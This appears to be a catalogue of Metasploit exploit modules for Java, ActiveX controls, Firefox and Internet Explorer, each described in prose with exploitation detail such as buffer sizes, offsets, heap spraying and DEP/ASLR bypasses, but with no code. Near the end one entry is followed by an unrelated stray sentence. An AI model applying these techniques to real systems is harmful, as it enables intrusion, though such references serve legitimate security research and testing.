This module exploits a vulnerability in Java Runtime Environment that allows an attacker to escape the Java Sandbox. By injecting a parameter into a javaws call within the BasicServiceImpl class the default java sandbox policy file can be therefore overwritten. The vulnerability affects version 6 prior to update 22. NOTE: Exploiting this vulnerability causes several sinister-looking popup windows saying that Java is "Downloading application."

windows/browser/java_cmm
This module abuses the Color Management classes from a Java Applet to run arbitrary Java code outside of the sandbox as exploited in the wild in February and March of 2013. The vulnerability affects Java version 7u15 and earlier and 6u41 and earlier and has been tested successfully on Windows XP SP3 and Windows 7 SP1 systems. This exploit doesn't bypass click-to-play, so the user must accept the java warning in order to run the malicious applet.

windows/browser/java_codebase_trust
This module exploits a vulnerability in the Java Runtime Environment that allows an attacker to run an applet outside of the Java Sandbox. When an applet is invoked with: 1. A "codebase" parameter that points at a trusted directory 2. A "code" parameter that is a URL that does not contain any dots the applet will run outside of the sandbox. This vulnerability affects JRE prior to version 6 update 24.

windows/browser/java_docbase_bof
This module exploits a flaw in the new plugin component of the Sun Java Runtime Environment before v6 Update 22. By specifying specific parameters to the new plugin, an attacker can cause a stack-based buffer overflow and execute arbitrary code. When the new plugin is invoked with a "launchjnlp" parameter, it will copy the contents of the "docbase" parameter to a stack-buffer using the "sprintf" function. A string of 396 bytes is enough to overflow the 256 byte stack buffer and overwrite some local variables as well as the saved return address. NOTE: The string being copied is first passed through the "WideCharToMultiByte". Due to this, only characters which have a valid localized multibyte representation are allowed. Invalid characters will be replaced with question marks ('?'). This vulnerability was originally discovered independently by both Stephen Fewer and Berend Jan Wever (SkyLined). Although exhaustive testing hasn't been done, all versions since version 6 Update 10 are believed to be affected by this vulnerability. This vulnerability was patched as part of the October 2010 Oracle Patch release.

windows/browser/java_mixer_sequencer
This module exploits a flaw within the handling of MixerSequencer objects in Java 6u18 and before. Exploitation id done by supplying a specially crafted MIDI file within an RMF File. When the MixerSequencer objects is used to play the file, the GM_Song structure is populated with a function pointer provided by a SONG block in the RMF. A Midi block that contains a MIDI with a specially crafted controller event is used to trigger the vulnerability. When triggering the vulnerability "ebx" points to a fake event in the MIDI file which stores the shellcode. A "jmp ebx" from msvcr71.dll is used to make the exploit reliable over java updates.

windows/browser/java_ws_arginject_altjvm
This module exploits a flaw in the Web Start plugin component of Sun Java Web Start. The arguments passed to Java Web Start are not properly validated. By passing the lesser known -J option, an attacker can pass arbitrary options directly to the Java runtime. By utilizing the -XXaltjvm option, as discussed by Ruben Santamarta, an attacker can execute arbitrary code in the context of an unsuspecting browser user. This vulnerability was originally discovered independently by both Ruben Santamarta and Tavis Ormandy. Tavis reported that all versions since version 6 Update 10 "are believed to be affected by this vulnerability." In order for this module to work, it must be ran as root on a server that does not serve SMB. Additionally, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.

windows/browser/java_ws_double_quote
This module exploits a flaw in the Web Start component of the Sun Java Runtime Environment. Parameters initial-heap-size and max-heap-size in a JNLP file can contain a double quote which is not properly sanitized when creating the command line for javaw.exe. This allows the injection of the -XXaltjvm option to load a jvm.dll from a remote UNC path into the java process. Thus an attacker can execute arbitrary code in the context of a browser user. This flaw was fixed in Oct. 2012 and affects JRE <= 1.6.35 and <= 1.7.07. In order for this module to work, it must be run as root on a server that does not serve SMB (In most cases, this means non-Windows hosts). Additionally, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. Alternatively, a UNC path containing a jvm.dll can be specified, bypassing the Windows limitation for the Metasploit host.

windows/browser/java_ws_vmargs
This module exploits a flaw in the Web Start component of the Sun Java Runtime Environment. The arguments passed to Java Web Start are not properly validated, allowing injection of arbitrary arguments to the JVM. By utilizing the lesser known -J option, an attacker can take advantage of the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method allows an attacker to execute arbitrary code in the context of an unsuspecting browser user. In order for this module to work, it must be run as root on a server that does not serve SMB. Additionally, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.

windows/browser/juniper_sslvpn_ive_setupdll
This module exploits a stack buffer overflow in the JuniperSetupDLL.dll library which is called by the JuniperSetup.ocx ActiveX control, as part of the Juniper SSL-VPN (IVE) appliance. By specifying an overly long string to the ProductName object parameter, the stack is overwritten.

windows/browser/kazaa_altnet_heap
This module exploits a stack buffer overflow in the Altnet Download Manager ActiveX Control (amd4.dll) bundled with Kazaa Media Desktop 3.2.7. By sending an overly long string to the "Install()" method, an attacker may be able to execute arbitrary code.

windows/browser/keyhelp_launchtripane_exec
This module exploits a code execution vulnerability in the KeyScript ActiveX control from keyhelp.ocx. It is packaged in several products or GE, such as Proficy Historian 4.5, 4.0, 3.5, and 3.1, Proficy HMI/SCADA 5.1 and 5.0, Proficy Pulse 1.0, Proficy Batch Execution 5.6, and SI7 I/O Driver between 7.20 and 7.42. When the control is installed with these products, the function "LaunchTriPane" will use ShellExecute to launch "hh.exe", with user controlled data as parameters. Because of this, the "-decompile" option can be abused to write arbitrary files on the remote system. Code execution can be achieved by first uploading the payload to the remote machine, and then upload another mof file, which enables Windows Management Instrumentation service to execute it. Please note that this module currently only works for Windows before Vista. On the other hand, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled. It is enabled and automatically started by default on Windows XP SP3

windows/browser/logitechvideocall_start
This module exploits a stack buffer overflow in the Logitech VideoCall ActiveX Control (wcamxmp.dll 2.0.3470.448). By sending an overly long string to the "Start()" method, an attacker may be able to execute arbitrary code.

windows/browser/lpviewer_url
This module exploits a stack buffer overflow in LPViewer ActiveX control (LPControll.dll 3.2.0.2). When sending an overly long string to the URL() property an attacker may be able to execute arbitrary code.

windows/browser/macrovision_downloadandexecute
This module exploits a stack buffer overflow in Macrovision InstallShield Update Service(Isusweb.dll 6.0.100.54472). By passing an overly long ProductCode string to the DownloadAndExecute method, an attacker may be able to execute arbitrary code.

windows/browser/macrovision_unsafe
This module allows attackers to execute code via an unsafe method in Macrovision InstallShield 2008.

windows/browser/malwarebytes_update_exec
This module exploits a vulnerability in the update functionality of Malwarebytes Anti-Malware consumer before 2.0.3 and Malwarebytes Anti-Exploit consumer 1.03.1.1220. Due to the lack of proper update package validation, a man-in-the-middle (MITM) attacker could execute arbitrary code by spoofing the update server data-cdn.mbamupdates.com and uploading an executable. This module has been tested successfully with MBAM 2.0.2.1012 and MBAE 1.03.1.1220.

windows/browser/maxthon_history_xcs
Cross Context Scripting (XCS) is possible in the Maxthon about:history page. Injection in such privileged/trusted browser zone can be used to modify configuration settings and execute arbitrary commands. Please note this module only works against specific versions of XCS. Currently, we've only successfully tested on Maxthon 3.1.7 build 600 up to 3.2.2 build 1000.

windows/browser/mcafee_mcsubmgr_vsprintf
This module exploits a flaw in the McAfee Subscription Manager ActiveX control. Due to an unsafe use of vsprintf, it is possible to trigger a stack buffer overflow by passing a large string to one of the COM-exposed routines, such as IsAppExpired. This vulnerability was discovered by Karl Lynn of eEye.

windows/browser/mcafee_mvt_exec
This module exploits a vulnerability found in McAfee Virtual Technician's MVTControl. This ActiveX control can be abused by using the GetObject() function to load additional unsafe classes such as WScript.Shell, therefore allowing remote code execution under the context of the user.

windows/browser/mcafeevisualtrace_tracetarget
This module exploits a stack buffer overflow in the McAfee Visual Trace 3.25 ActiveX Control (NeoTraceExplorer.dll 1.0.0.1). By sending an overly long string to the "TraceTarget()" method, an attacker may be able to execute arbitrary code.

windows/browser/mirc_irc_url
This module exploits a stack buffer overflow in mIRC 6.1. By submitting an overly long and specially crafted URL to the 'irc' protocol, an attacker can overwrite the buffer and control program execution.

windows/browser/mozilla_attribchildremoved
This module exploits a use-after-free vulnerability in Firefox 8/8.0.1 and 9/9.0.1. Removal of child nodes from the nsDOMAttribute can allow for a child to still be accessible after removal due to a premature notification of AttributeChildRemoved. Since mFirstChild is not set to NULL until after this call is made, this means the removed child will be accessible after it has been removed. By carefully manipulating the memory layout, this can lead to arbitrary code execution.

windows/browser/mozilla_firefox_onreadystatechange
This module exploits a vulnerability found on Firefox 17.0.6, specifically a use after free of a DocumentViewerImpl object, triggered via a specially crafted web page using onreadystatechange events and the window.stop() API, as exploited in the wild on 2013 August to target Tor Browser users.

windows/browser/mozilla_firefox_xmlserializer
This module exploits a vulnerability found on Firefox 17.0 (< 17.0.2), specifically a use-after-free of an Element object, when using the serializeToStream method with a specially crafted OutputStream defining its own write function. This module has been tested successfully with Firefox 17.0.1 ESR, 17.0.1 and 17.0 on Windows XP SP3.

windows/browser/mozilla_interleaved_write
This module exploits a code execution vulnerability in Mozilla Firefox caused by interleaved calls to document.write and appendChild. This module was written based on a live exploit found in the wild.

windows/browser/mozilla_mchannel
This module exploits a use after free vulnerability in Mozilla Firefox 3.6.16. An OBJECT Element mChannel can be freed via the OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel becomes a dangling pointer and can be reused when setting the OBJECTs data attribute. (Discovered by regenrecht). This module uses heapspray with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay, a windows 7 target was provided using JAVA 6 and below to avoid aslr.

windows/browser/mozilla_nssvgvalue
This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1). The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y) uses a loop which can result in an out-of-bounds access to attacker-controlled memory. The mObserver ElementAt() function (which picks up pointers), does not validate if a given index is out of bound. If a custom observer of nsSVGValue is created, which removes elements from the original observer, and memory layout is manipulated properly, the ElementAt() function might pick up an attacker provided pointer, which can be leveraged to gain remote arbitrary code execution.

windows/browser/mozilla_nstreerange
This module exploits a code execution vulnerability in Mozilla Firefox 3.6.x <= 3.6.16 and 3.5.x <= 3.5.17 found in nsTreeSelection. By overwriting a subfunction of invalidateSelection it is possible to free the nsTreeRange object that the function currently operates on. Any further operations on the freed object can result in remote code execution. Utilizing the call setup the function provides it's possible to bypass DEP without the need for a ROP. Sadly this exploit is still either dependent on Java or bound by ASLR because Firefox doesn't employ any ASLR-free modules anymore.

windows/browser/mozilla_reduceright
This module exploits a vulnerability found in Mozilla Firefox 3.6. When an array object is configured with a large length value, the reduceRight() method may cause an invalid index being used, allowing arbitrary remote code execution. Please note that the exploit requires a longer amount of time (compare to a typical browser exploit) in order to gain control of the machine.

windows/browser/ms03_020_ie_objecttype
This module exploits a vulnerability in Internet Explorer's handling of the OBJECT type attribute.

windows/browser/ms05_054_onload
This bug is triggered when the browser handles a JavaScript 'onLoad' handler in conjunction with an improperly initialized 'window()' JavaScript function. This exploit results in a call to an address lower than the heap. The javascript prompt() places our shellcode near where the call operand points to. We call prompt() multiple times in separate iframes to place our return address. We hide the prompts in a popup window behind the main window. We spray the heap a second time with our shellcode and point the return address to the heap. I use a fairly high address to make this exploit more reliable. IE will crash when the exploit completes. Also, please note that Internet Explorer must allow popups in order to continue exploitation.

windows/browser/ms06_001_wmf_setabortproc
This module exploits a vulnerability in the GDI library included with Windows XP and 2003. This vulnerability uses the 'Escape' metafile function to execute arbitrary code through the SetAbortProc procedure. This module generates a random WMF record stream for each request.

windows/browser/ms06_013_createtextrange
This module exploits a code execution vulnerability in Microsoft Internet Explorer. Both IE6 and IE7 (Beta 2) are vulnerable. It will corrupt memory in a way, which, under certain circumstances, can lead to an invalid/corrupt table pointer dereference. EIP will point to a very remote, non-existent memory location. This module is the result of merging three different exploit submissions and has only been reliably tested against Windows XP SP2. This vulnerability was independently discovered by multiple parties. The heap spray method used by this exploit was pioneered by Skylined.

windows/browser/ms06_055_vml_method
This module exploits a code execution vulnerability in Microsoft Internet Explorer using a buffer overflow in the VML processing code (VGX.dll). This module has been tested on Windows 2000 SP4, Windows XP SP0, and Windows XP SP2.

windows/browser/ms06_057_webview_setslice
This module exploits a flaw in the WebViewFolderIcon ActiveX control included with Windows 2000, Windows XP, and Windows 2003. This flaw was published during the Month of Browser Bugs project (MoBB #18).

windows/browser/ms06_067_keyframe
This module exploits a heap overflow vulnerability in the KeyFrame method of the direct animation ActiveX control. This is a port of the exploit implemented by Alexander Sotirov.

windows/browser/ms06_071_xml_core
This module exploits a code execution vulnerability in Microsoft XML Core Services which exists in the XMLHTTP ActiveX control. This module is the modified version of http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6 + Microsoft XML Core Services 4.0 SP2.

windows/browser/ms07_017_ani_loadimage_chunksize
This module exploits a buffer overflow vulnerability in the LoadAniIcon() function in USER32.dll. The flaw can be triggered through Internet Explorer 6 and 7 by using the CURSOR style sheet directive to load a malicious .ANI file. The module can also exploit Mozilla Firefox by using a UNC path in a moz-icon URL and serving the .ANI file over WebDAV. The vulnerable code in USER32.dll will catch any exceptions that occur while the invalid cursor is loaded, causing the exploit to silently fail when the wrong target has been chosen. This vulnerability was discovered by Alexander Sotirov of Determina and was rediscovered, in the wild, by McAfee.

windows/browser/ms08_041_snapshotviewer
This module allows remote attackers to place arbitrary files on a users file system via the Microsoft Office Snapshot Viewer ActiveX Control.

windows/browser/ms08_053_mediaencoder
This module exploits a stack buffer overflow in Windows Media Encoder 9. When sending an overly long string to the GetDetailsString() method of wmex.dll an attacker may be able to execute arbitrary code.

windows/browser/ms08_070_visual_studio_msmask
This module exploits a stack buffer overflow in Microsoft's Visual Studio 6.0. When passing a specially crafted string to the Mask parameter of the Mdmask32.ocx ActiveX Control, an attacker may be able to execute arbitrary code.

windows/browser/ms08_078_xml_corruption
This module exploits a vulnerability in the data binding feature of Internet Explorer. In order to execute code reliably, this module uses the .NET DLL memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is used to create a fake vtable at a known location with all methods pointing to our payload. Since the .text segment of the .NET DLL is non-writable, a prefixed code stub is used to copy the payload into a new memory segment and continue execution from there.

windows/browser/ms09_002_memory_corruption
This module exploits an error related to the CFunctionPointer function when attempting to access uninitialized memory. A remote attacker could exploit this vulnerability to corrupt memory and execute arbitrary code on the system with the privileges of the victim.

windows/browser/ms09_043_owc_htmlurl
This module exploits a buffer overflow in Microsoft's Office Web Components. When passing an overly long string as the "HTMLURL" parameter an attacker can execute arbitrary code.

windows/browser/ms09_043_owc_msdso
This module exploits a memory corruption vulnerability within versions 10 and 11 of the Office Web Component Spreadsheet ActiveX control. This module was based on an exploit found in the wild.

windows/browser/ms09_072_style_object
This module exploits a vulnerability in the getElementsByTagName function as implemented within Internet Explorer.

windows/browser/ms10_002_aurora
This module exploits a memory corruption flaw in Internet Explorer. This flaw was found in the wild and was a key component of the "Operation Aurora" attacks that lead to the compromise of a number of high profile companies. The exploit code is a direct port of the public sample published to the Wepawet malware analysis site. The technique used by this module is currently identical to the public sample, as such, only Internet Explorer 6 can be reliably exploited.

windows/browser/ms10_002_ie_object
This module exploits a vulnerability found in Internet Explorer's mshtml component. Due to the way IE handles objects in memory, it is possible to cause a pointer in CTableRowCellsCollectionCacheItem::GetNext to be used even after it gets freed, therefore allowing remote code execution under the context of the user. This particular vulnerability was also one of 2012's Pwn2Own challenges, and was later explained by Peter Vreugdenhil with exploitation details. Instead of Peter's method, this module uses heap spraying like the 99% to store a specially crafted memory layout before re-using the freed memory.

windows/browser/ms10_018_ie_behaviors
This module exploits a use-after-free vulnerability within the DHTML behaviors functionality of Microsoft Internet Explorer versions 6 and 7. This bug was discovered being used in-the-wild and was previously known as the "iepeers" vulnerability. The name comes from Microsoft's suggested workaround to block access to the iepeers.dll file. According to Nico Waisman, "The bug itself is when trying to persist an object using the setAttribute, which end up calling VariantChangeTypeEx with both the source and the destination being the same variant. So if you send as a variant an IDISPATCH the algorithm will try to do a VariantClear of the destination before using it. This will end up on a call to PlainRelease which deref the reference and clean the object." NOTE: Internet Explorer 8 and Internet Explorer 5 are not affected.

windows/browser/ms10_018_ie_tabular_activex
This module exploits a memory corruption vulnerability in the Internet Explorer Tabular Data ActiveX Control. Microsoft reports that version 5.01 and 6 of Internet Explorer are vulnerable. By specifying a long value as the "DataURL" parameter to this control, it is possible to write a NUL byte outside the bounds of an array. By targeting control flow data on the stack, an attacker can execute arbitrary code.

windows/browser/ms10_022_ie_vbscript_winhlp32
This module exploits a code execution vulnerability that occurs when a user presses F1 on MessageBox originated from VBscript within a web page. When the user hits F1, the MessageBox help functionality will attempt to load and use a HLP file from an SMB or WebDAV (if the WebDAV redirector is enabled) server. This particular version of the exploit implements a WebDAV server that will serve HLP file as well as a payload EXE. During testing warnings about the payload EXE being unsigned were witnessed. A future version of this module might use other methods that do not create such a warning.

windows/browser/ms10_026_avi_nsamplespersec
This module exploits a buffer overflow in l3codecx.ax while processing a AVI files with MPEG Layer-3 audio contents. The overflow only allows to overwrite with 0's so the three least significant bytes of EIP saved on stack are overwritten and shellcode is mapped using the .NET DLL memory technique pioneered by Alexander Sotirov and Mark Dowd. Please note on IE 8 targets, your malicious URL must be a trusted site in order to load the .Net control.

windows/browser/ms10_042_helpctr_xss_cmd_exec
Help and Support Center is the default application provided to access online documentation for Microsoft Windows. Microsoft supports accessing help documents directly via URLs by installing a protocol handler for the scheme "hcp". Due to an error in validation of input to hcp:// combined with a local cross site scripting vulnerability and a specialized mechanism to launch the XSS trigger, arbitrary command execution can be achieved. On IE7 on XP SP2 or SP3, code execution is automatic. If WMP9 is installed, it can be used to launch the exploit automatically. If IE8 and WMP11, either can be used to launch the attack, but both pop dialog boxes asking the user if execution should continue. This exploit detects if non-intrusive mechanisms are available and will use one if possible. In the case of both IE8 and WMP11, the exploit defaults to using an iframe on IE8, but is configurable by setting the DIALOGMECH option to "none" or "player". This module creates a WebDAV service from which the payload is copied to the victim machine.

windows/browser/ms10_046_shortcut_icon_dllloader
This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious DLL. This module creates a WebDAV service that can be used to run an arbitrary payload when accessed as a UNC path.

windows/browser/ms10_090_ie_css_clip
This module exploits a memory corruption vulnerability within Microsoft's HTML engine (mshtml). When parsing an HTML page containing a specially crafted CSS tag, memory corruption occurs that can lead arbitrary code execution. It seems like Microsoft code inadvertently increments a vtable pointer to point to an unaligned address within the vtable's function pointers. This leads to the program counter being set to the address determined by the address "[vtable+0x30+1]". The particular address depends on the exact version of the mshtml library in use. Since the address depends on the version of mshtml, some versions may not be exploitable. Specifically, those ending up with a program counter value within another module, in kernel space, or just not able to be reached with various memory spraying techniques. Also, since the address is not controllable, it is unlikely to be possible to use ROP to bypass non-executable memory protections.

windows/browser/ms11_003_ie_css_import
This module exploits a memory corruption vulnerability within Microsoft\'s HTML engine (mshtml). When parsing an HTML page containing a recursive CSS import, a C++ object is deleted and later reused. This leads to arbitrary code execution. This exploit utilizes a combination of heap spraying and the .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not opt-in to ASLR. As such, this module should be reliable on all Windows versions with .NET 2.0.50727 installed.

windows/browser/ms11_050_mshtml_cobjectelement
This module exploits a use-after-free vulnerability in Internet Explorer. The vulnerability occurs when an invalid <object> tag exists and other elements overlap/cover where the object tag should be when rendered (due to their styles/positioning). The mshtml!CObjectElement is then freed from memory because it is invalid. However, the mshtml!CDisplay object for the page continues to keep a reference to the freed <object> and attempts to call a function on it, leading to the use-after-free. Please note that for IE 8 targets, JRE (Java Runtime Environment) is required to bypass DEP (Data Execution Prevention).

windows/browser/ms11_081_option
This module exploits a vulnerability in Microsoft Internet Explorer. A memory corruption may occur when the Option cache isn't updated properly, which allows other JavaScript methods to access a deleted Option element, and results in code execution under the context of the user.

windows/browser/ms11_093_ole32
This module exploits a type confusion vulnerability in the OLE32 component of Windows XP SP3. The vulnerability exists in the CPropertyStorage::ReadMultiple function. A Visio document with a specially crafted Summary Information Stream embedded allows to get remote code execution through Internet Explorer, on systems with Visio Viewer installed.

windows/browser/ms12_004_midi
This module exploits a heap overflow vulnerability in the Windows Multimedia Library (winmm.dll). The vulnerability occurs when parsing specially crafted MIDI files. Remote code execution can be achieved by using the Windows Media Player ActiveX control. Exploitation is done by supplying a specially crafted MIDI file with specific events, causing the offset calculation being higher than what is available on the heap (0x400 allocated by WINMM!winmmAlloc), and then allowing us to either "inc al" or "dec al" a byte. This can be used to corrupt an array (CImplAry) we setup, and force the browser to confuse types from tagVARIANT objects, which leverages remote code execution under the context of the user. Note: At this time, for IE 8 target, msvcrt ROP is used by default. However, if you know your target's patch level, you may also try the 'MSHTML' advanced option for an info leak based attack. Currently, this module only supports two MSHTML builds: 8.0.6001.18702, which is often seen in a newly installed XP SP3. Or 8.0.6001.19120, which is patch level before the MS12-004 fix. Also, based on our testing, the vulnerability does not seem to trigger when the victim machine is operated via rdesktop.

windows/browser/ms12_037_ie_colspan
This module exploits a heap overflow vulnerability in Internet Explorer caused by an incorrect handling of the span attribute for col elements from a fixed table, when they are modified dynamically by javascript code.

windows/browser/ms12_037_same_id
This module exploits a memory corruption flaw in Internet Explorer 8 when handling objects with the same ID property. At the moment this module targets IE8 over Windows XP SP3 and Windows 7. This module supports heap massaging as well as the heap spray method seen in the wild (Java msvcrt71.dll).

windows/browser/ms13_009_ie_slayoutrun_uaf
This module exploits a use-after-free vulnerability in Microsoft Internet Explorer where a CParaElement node is released but a reference is still kept in CDoc. This memory is reused when a CDoc relayout is performed.

windows/browser/ms13_022_silverlight_script_object
This module exploits a vulnerability in Microsoft Silverlight. The vulnerability exists on the Initialize() method from System.Windows.Browser.ScriptObject, which access memory in an unsafe manner. Since it is accessible for untrusted code (user controlled) it's possible to dereference arbitrary memory which easily leverages to arbitrary code execution. In order to bypass DEP/ASLR a second vulnerability is used, in the public WriteableBitmap class from System.Windows.dll. This module has been tested successfully on IE6 - IE10, Windows XP SP3 / Windows 7 SP1.

windows/browser/ms13_037_svg_dashstyle
This module exploits an integer overflow vulnerability on Internet Explorer. The vulnerability exists in the handling of the dashstyle.array length for vml shapes on the vgx.dll module. The exploit has been built and tested specifically against Windows 7 SP1 with Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to bypass ASLR, and by default the info leak is used. To make sure the leak is successful, the ntdll version should be either v6.1.7601.17514 (the default dll version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725 (installed after apply MS12-001). If the target doesn't have the version the exploit wants, it will refuse to attack by sending a fake 404 message (webpage not found). If you wish to try the JRE6 component instead to bypass ASLR, you can set the advanced datastore option to 'JRE6'. If JRE6 is chosen but the target doesn't have this particular component, the exploit will also refuse to attack by sending a 404 message.

windows/browser/ms13_055_canchor
In IE8 standards mode, it's possible to cause a use-after-free condition by first creating an illogical table tree, where a CPhraseElement comes after CTableRow, with the final node being a sub table element. When the CPhraseElement's outer content is reset by using either outerText or outerHTML through an event handler, this triggers a free of its child element (in this case, a CAnchorElement, but some other objects apply too), but a reference is still kept in function SRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next functions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's SecurityContext virtual function at offset +0x70, which results a crash. An attacker can take advantage of this by first creating an CAnchorElement object, let it free, and then replace the freed memory with another fake object. Successfully doing so may allow arbitrary code execution under the context of the user. This bug is specific to Internet Explorer 8 only. It was originally discovered by Jose Antonio Vazquez Gonzalez and reported to iDefense, but was discovered again by Orange Tsai at Hitcon 2013.

windows/browser/ms13_059_cflatmarkuppointer
This is a memory corruption bug found in Microsoft Internet Explorer. On IE 9, it seems to only affect certain releases of mshtml.dll, ranging from a newly installed IE9 (9.0.8112.16446), to 9.00.8112.16502 (July 2013 update). IE8 requires a different way to trigger the vulnerability, but not currently covered by this module. The issue is specific to the browser's IE7 document compatibility, which can be defined in X-UA-Compatible, and the content editable mode must be enabled. An "onmove" event handler is also necessary to be able to trigger the bug, and the event will be run twice before the crash. The first time is due to the position change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable' object is created during a "SelectAll" command, and this object will be used later on for the crash. The second onmove event seems to be triggered by a InsertButton (or Insert-whatever) command, which is also responsible for the free of object CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and then passes this on to the next functions (GetLineInfo -> QIClassID). When this reference arrives in function QIClassID, an access violation finally occurs when the function is trying to call QueryInterface() with the bad reference, and this results a crash. Successful control of the freed memory may leverage arbitrary code execution under the context of the user. Note: It is also possible to see a different object being freed and used, doesn't always have to be CFlatMarkupPointer.

windows/browser/ms13_069_caret
This module exploits a use-after-free vulnerability found in Internet Explorer, specifically in how the browser handles the caret (text cursor) object. In IE's standards mode, the caret handling's vulnerable state can be triggered by first setting up an editable page with an input field, and then we can force the caret to update in an onbeforeeditfocus event by setting the body's innerHTML property. In this event handler, mshtml!CCaret::`vftable' can be freed using a document.write() function, however, mshtml!CCaret::UpdateScreenCaret remains unaware of this change, and still uses the same reference to the CCaret object. When the function tries to use this invalid reference to call a virtual function at offset 0x2c, it finally results a crash. Precise control of the freed object allows arbitrary code execution under the context of the user.

windows/browser/ms13_080_cdisplaypointer
This module exploits a vulnerability found in Microsoft Internet Explorer. It was originally found being exploited in the wild targeting Japanese and Korean IE8 users on Windows XP, around the same time frame as CVE-2013-3893, except this was kept out of the public eye by multiple research companies and the vendor until the October patch release. This issue is a use-after-free vulnerability in CDisplayPointer via the use of a "onpropertychange" event handler. To set up the appropriate buggy conditions, we first craft the DOM tree in a specific order, where a CBlockElement comes after the CTextArea element. If we use a select() function for the CTextArea element, two important things will happen: a CDisplayPointer object will be created for CTextArea, and it will also trigger another event called "onselect". The "onselect" event will allow us to set up for the actual event handler we want to abuse - the "onpropertychange" event. Since the CBlockElement is a child of CTextArea, if we do a node swap of CBlockElement in "onselect", this will trigger "onpropertychange". During "onpropertychange" event handling, a free of the CDisplayPointer object can be forced by using an "Unselect" (other approaches also apply), but a reference of this freed memory will still be kept by CDoc::ScrollPointerIntoView, specifically after the CDoc::GetLineInfo call, because it is still trying to use that to update CDisplayPointer's position. When this invalid reference arrives in QIClassID, a crash finally occurs due to accessing the freed memory. By controlling this freed memory, it is possible to achieve arbitrary code execution under the context of the user.

windows/browser/ms13_090_cardspacesigninhelper
This module exploits a vulnerability on the CardSpaceClaimCollection class from the icardie.dll ActiveX control. The vulnerability exists while the handling of the CardSpaceClaimCollection object. CardSpaceClaimCollections stores a collection of elements on a SafeArray and keeps a size field, counting the number of elements on the collection. By calling the remove() method on an empty CardSpaceClaimCollection it is possible to underflow the length field, storing a negative integer. Later, a call to the add() method will use the corrupted length field to compute the address where write into the SafeArray data, allowing to corrupt memory with a pointer to controlled contents. This module achieves code execution by using VBScript as discovered in the wild on November 2013 to (1) create an array of html OBJECT elements, (2) create holes, (3) create a CardSpaceClaimCollection whose SafeArray data will reuse one of the holes, (4) corrupt one of the legit OBJECT elements with the described integer overflow and (5) achieve code execution by forcing the use of the corrupted OBJECT.

windows/fileformat/ibm_pcm_ws
The IBM Personal Communications I-Series application WorkStation is susceptible to a stack-based buffer overflow vulnerability within file parsing in which data copied to a location in memory exceeds the size of the reserved destination area. The buffer is located on the runtime program stack. When the WorkStation file is opened it will reach the code path at 0x67575180 located in pcspref.dll which conducts string manipulation and validation on the data supplied in the WorkStation file. The application will first check if 'Profile' header exists and appends a dot with the next parameter within the file. It will then measure the character length of the header by calling strcspn with a dot as its null-terminated character. It will then write the header into memory and ensure the header ends with a NUL character. The parameter character array is passed to the strcpy() function. The application has declared a 52-element character array for the destination for strcpy function. The function does not perform bounds checking therefore, data can be written paste the end of the buffer variable resulting in corruption of adjacent variables including other local variables, program state information and function arguments. You will notice that the saved RETURN address at offset 0x6c is overwritten by the data written past the buffer. To ensure we can perform arbitrary code execution we must we provide a valid pointer at 0x74 which is used as an argument for the called function at 0x675751ED as an id file extension parameter. Once the caller regains control we will reach our RETURN. The Ret instruction will be used to pop the overwritten saved return address which was corrupted. This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform. Versions tested: IBM System i Access for Windows V6R1M0 version 06.01.0001.0000a Which bundles pcsws.exe version 5090.27271.709 Tested on: Microsoft Windows XP [Version 5.1.2600] Microsoft Windows Vista [Version 6.0.6002] Microsoft Windows 7 [Version 6.1.7600]

windows/fileformat/mcafee_showreport_exec
This module exploits a vulnerability found in McAfee Security-as-a-Service. The ShowReport() function (located in the myCIOScn.dll ActiveX component) fails to check the FileName argument, and passes it on to a ShellExecuteW() function, therefore allows any malicious attacker to execute any process that's on the local system. However, if the victim machine is connected to a remote share (or something similar), then it's also possible to execute arbitrary code. Please note that a custom template is required for the payload, because the default Metasploit template is detectable by McAfee -- any Windows binary, such as calc.exe or notepad.exe, should bypass McAfee fine.

windows/fileformat/mediacoder_m3u
This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability occurs when adding an .m3u, allowing arbitrary code execution under the context of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder runs with DEP.

windows/fileformat/microsoft_windows_contact
This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw is due to the processing of ".contact" files <c:Url> node param which takes an expected website value, however if an attacker references an executable file it will run that instead without warning instead of performing expected web navigation. This is dangerous and would be unexpected to an end user. Executable files can live in a sub-directory so when the ".contact" website link is clicked it traverses directories towards the executable and runs. Making matters worse is if the files are compressed then downloaded "mark of the web" (MOTW) may potentially not work as expected with certain archive utilitys. The ".\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory. This advisory is a duplicate issue that currently affects Windows .VCF files, and released for the sake of completeness as it affects Windows .contact files as well.

windows/fileformat/millenium_mp3_pls

Or, it can also be done from the console with the MPlayer "-sub" option.

windows/fileformat/ms09_067_excel_featheader
